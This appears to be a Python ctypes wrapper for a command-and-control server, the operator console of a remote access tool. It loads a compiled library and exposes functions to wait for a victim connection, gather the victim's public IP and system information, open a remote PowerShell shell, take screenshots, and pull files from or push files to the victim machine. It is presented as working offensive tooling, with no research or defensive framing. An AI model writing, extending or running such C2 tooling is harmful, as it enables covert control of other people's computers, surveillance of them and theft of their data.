import ctypes
from ctypes import c_void_p, c_char_p, c_int, POINTER, Structure
import os
from typing import Optional

class C2Wrapper:
    """Wrapper class for C2 server operations"""
    
    def __init__(self, lib_path: str = "./bin/lib.so"):

        if not os.path.exists(lib_path):
            raise FileNotFoundError(f"Library not found: {os.path.abspath(lib_path)}")
        
        # Load the shared library
        self.lib = ctypes.CDLL(lib_path)
        
        # Define return types and argument types for each function
        self._setup_function_signatures()
        
        # Socket file descriptor
        self.client_fd: Optional[int] = None

        # ipv4 for later use
        self.ipv4 = None
    
    def _setup_function_signatures(self):
        """Configure ctypes function signatures"""
        
        # void free_wrapper(void* ptr)
        self.lib.free_wrapper.argtypes = [c_void_p]
        self.lib.free_wrapper.restype = None
        
        # sock_t sock_setup()
        self.lib.sock_setup.argtypes = []
        self.lib.sock_setup.restype = c_int
        
        # void cleanup(sock_t client_fd)
        self.lib.cleanup.argtypes = [c_int]
        self.lib.cleanup.restype = None
        
        # char* client_info(sock_t client_fd)
        self.lib.client_info.argtypes = [c_int]
        self.lib.client_info.restype = c_void_p
        
        # void psh_handle(sock_t client_fd)
        self.lib.psh_handle.argtypes = [c_int]
        self.lib.psh_handle.restype = None
        
        # void screenshot_handle(sock_t client_fd)
        self.lib.screenshot_handle.argtypes = [c_int]
        self.lib.screenshot_handle.restype = None
        
        # void download_file_from_client(sock_t, char*, char*)
        self.lib.download_file_from_client.argtypes = [c_int, c_char_p, c_char_p]
        self.lib.download_file_from_client.restype = None
        
        # void upload_file_to_client(sock_t, char*, char*)
        self.lib.upload_file_to_client.argtypes = [c_int, c_char_p, c_char_p]
        self.lib.upload_file_to_client.restype = None
    
    def _free_cstring(self, ptr: int):
        """Free memory allocated by C code"""
        if ptr:
            self.lib.free_wrapper(ptr)
    
    def setup(self) -> int:
        """
        Set up the C2 server socket and wait for client connection
        
        Returns:
            Client socket file descriptor
        """
        self.client_fd = self.lib.sock_setup()
        return self.client_fd
    
    def cleanup(self):
        """Clean up and close the connection"""
        if self.client_fd is not None:
            self.lib.cleanup(self.client_fd)
            self.client_fd = None
    
    def get_client_info(self) -> str:
        """
        Get client information
        
        Returns:
            Client info string
        """
        if self.client_fd is None:
            raise RuntimeError("Client not connected. Call setup() first.")
        
        ptr = self.lib.client_info(self.client_fd)
        if not ptr:
            return ""
        
        # Convert C string to Python string
        result = ctypes.string_at(ptr).decode('utf-8', errors='replace')
        self._free_cstring(ptr)
        # Get ipv4
        for line in result.splitlines():
            if line.startswith("Public IP"):
                self.ipv4 = line.split(":", 1)[1].strip()
        return result
    
    def interactive_shell(self):
        """
        Start interactive PowerShell/command shell session
        This function will block until the user types 'quit'
        """
        if self.client_fd is None:
            raise RuntimeError("Client not connected. Call setup() first.")
        
        self.lib.psh_handle(self.client_fd)
    
    def take_screenshot(self):
        """
        Capture screenshot from client and save to file
        File will be saved as screenshot_<timestamp>.bmp
        """
        if self.client_fd is None:
            raise RuntimeError("Client not connected. Call setup() first.")
        
        self.lib.screenshot_handle(self.client_fd)
    
    def download_file(self, remote_path: str, local_path: str):
        """
        Download a file from the client
        
        Args:
            remote_path: Path to file on client machine
            local_path: Path to save file locally
        """
        if self.client_fd is None:
            raise RuntimeError("Client not connected. Call setup() first.")
        
        remote_bytes = remote_path.encode('utf-8')
        local_bytes = local_path.encode('utf-8')
        
        self.lib.download_file_from_client(
            self.client_fd,
            remote_bytes,
            local_bytes
        )
    
    def upload_file(self, local_path: str, remote_path: str):
        """
        Upload a file to the client
        
        Args:
            local_path: Path to file on local machine
            remote_path: Path to save file on client machine
        """
        if self.client_fd is None:
            raise RuntimeError("Client not connected. Call setup() first.")
        
        if not os.path.exists(local_path):
            raise FileNotFoundError(f"Local file not found: {local_path}")
        
        local_bytes = local_path.encode('utf-8')
        remote_bytes = remote_path.encode('utf-8')
        
        self.lib.upload_file_to_client(
            self.client_fd,
            remote_bytes,
            local_bytes
        )